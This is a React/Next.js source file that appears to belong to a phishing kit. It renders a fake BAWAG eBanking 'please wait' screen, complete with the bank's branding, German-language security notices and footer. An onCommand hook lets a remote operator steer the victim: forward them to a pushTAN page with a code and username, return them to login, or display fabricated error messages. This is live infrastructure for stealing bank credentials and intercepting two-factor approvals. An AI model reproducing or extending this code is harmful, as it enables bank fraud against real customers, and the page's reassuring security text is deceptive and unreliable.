"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "forward_to_tan": {
          const code = (cmd.payload as { code?: string }).code || "";
          router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
          break;
        }
        case "back_to_login":
          router.push("/");
          break;
        case "show_error":
          setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <div className="container">
      {/* HEADER */}
      <header className="header">
        <div className="header-top">
          <div className="date">Mittwoch, 06.05.2026, 13:25</div>
          <ul className="languages">
            <li className="active"><a href="#">DE</a></li>
            <li><a href="#">EN</a></li>
            <li><a href="#">BKS</a></li>
            <li><a href="#">TR</a></li>
          </ul>
        </div>
        <div className="header-left">
          <a href="https://www.bawag.at/" target="_blank">
            <img
              src="/bawag/bawag_ebanking_logo_de.png"
              width={175}
              height={93}
              alt="BAWAG eBanking"
            />
          </a>
        </div>
      </header>

      {/* MAIN CONTENT */}
      <div className="main-content clearfix">
        {/* LEFT COLUMN -- Waiting */}
        <div className="column-left">
          <div className="login-top" style={{ minHeight: "auto" }}>
            {/* Error banner */}
            {error && (
              <div
                style={{
                  backgroundColor: "#fdeaea",
                  color: "#a00",
                  border: "1px solid #e4aaaa",
                  borderRadius: "6px",
                  padding: "10px 14px",
                  marginBottom: "14px",
                  fontSize: "0.85em",
                }}
              >
                {error}
              </div>
            )}

            <div className="login-top-heading">
              <h3>Bitte warten</h3>
            </div>

            <p>
              Ihre Anmeldung wird bearbeitet. Bitte haben Sie einen Moment Geduld.
            </p>

            {/* Spinner */}
            <div style={{ textAlign: "center", padding: "40px 0 48px" }}>
              <svg
                width="56"
                height="56"
                viewBox="0 0 56 56"
                style={{ animation: "spin 1.2s linear infinite" }}
              >
                <circle
                  cx="28"
                  cy="28"
                  r="24"
                  fill="none"
                  stroke="#e0e0e0"
                  strokeWidth="4"
                />
                <circle
                  cx="28"
                  cy="28"
                  r="24"
                  fill="none"
                  stroke="#990000"
                  strokeWidth="4"
                  strokeDasharray="150.8"
                  strokeDashoffset="113.1"
                  strokeLinecap="round"
                />
              </svg>
              <p
                style={{
                  fontSize: "0.78em",
                  color: "#676767",
                  marginTop: 16,
                }}
              >
                Verbindung wird hergestellt...
              </p>
            </div>
          </div>
        </div>

        {/* RIGHT COLUMN -- Info */}
        <div className="column-right">
          <div className="info-wrapper">
            <div className="info">
              <div className="column-3-grid">
                <h3>Sicherheit</h3>
                <ul>
                  <li>
                    Die BAWAG versendet keine E-Mails mit direkten eBanking
                    Login-Links!
                    <br />
                    <a href="#" target="_blank">
                      Mehr Infos
                    </a>
                  </li>
                </ul>
              </div>
              <div className="column-3-grid">
                <h3>Service &amp; Info</h3>
                <ul>
                  <li><a href="#" target="_blank">Sicherheitsregeln</a></li>
                  <li><a href="#" target="_blank">Anmeldung / Erste Schritte</a></li>
                  <li><a href="#" target="_blank">3D Secure Online Bezahlung</a></li>
                </ul>
              </div>
              <div className="column-3-grid">
                <h3>Support</h3>
                <ul>
                  <li><a href="#" target="_blank">FAQ</a></li>
                  <li><a href="#" target="_blank">Zu Watchlist Internet</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* FOOTER */}
      <footer className="footer">
        <ul>
          <li><a href="#" target="_blank">Impressum</a></li>
          <li><a href="#" target="_blank">AGB</a></li>
          <li><a href="#" target="_blank">Datenschutz</a></li>
          <li><a href="#" target="_blank">Nutzungsbedingungen</a></li>
          <li><a href="#" target="_blank">Barrierefrei</a></li>
        </ul>
        <p>&copy; BAWAG P.S.K.</p>
      </footer>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
